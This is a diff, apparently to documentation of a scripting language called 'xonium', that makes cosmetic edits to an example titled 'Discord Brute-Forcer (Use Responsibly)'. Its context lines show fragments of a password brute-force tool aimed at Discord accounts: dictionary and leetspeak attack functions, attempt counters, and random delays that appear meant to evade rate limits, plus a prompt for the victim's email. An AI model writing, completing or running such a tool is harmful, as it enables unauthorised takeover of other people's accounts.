@@ -52,8 +52,8 @@ if drv.getcurrenturl() == "https://github.com/" {
 drv.close()```
 
 Example Three = Discord Brute-Forcer (Use Responsibly)
-```
-import "xonium"
+
+```import "xonium"
 import "os"
 import "json"
 import "math"
@@ -166,7 +166,7 @@ let dictionaryattack = fn(email) {
                 return found
             }
         } catch e {
-            // skip
+            // uwu
         }
         if attempts % 500 == 0 {
             randomdelay(2, 5)
@@ -252,7 +252,7 @@ let leetattack = fn(email) {
                     return found
                 }
             } catch e {
-                // skip
+                // uwu 
             }
             if attempts % 1000 == 0 {
                 randomdelay(2, 4)
@@ -265,7 +265,7 @@ let leetattack = fn(email) {
 }
 
 let main = fn() {
-    print("=== DISCORD PASSWORD BRUTE FORCE ===")
+    print("--- DISCORD PASSWORD BRUTE FORCE ---")
     print("enter discord email:")
     let email = input("> ")
     
